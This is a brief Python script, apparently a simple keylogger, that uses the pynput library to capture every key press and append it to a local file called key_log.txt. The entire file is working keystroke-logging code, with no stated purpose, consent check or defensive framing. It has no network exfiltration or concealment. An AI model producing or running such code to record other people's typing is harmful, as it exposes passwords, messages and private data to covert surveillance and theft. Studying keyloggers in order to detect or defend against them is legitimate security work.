from pynput import keyboard

# File to store the logged keys
log_file = "key_log.txt"

def on_press(key):
    try:
        k = key.char  # Normal keys
    except AttributeError:
        k = str(key)  # Special keys (e.g., space, shift)

    with open(log_file, "a") as f:
        f.write(k + "\n")

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
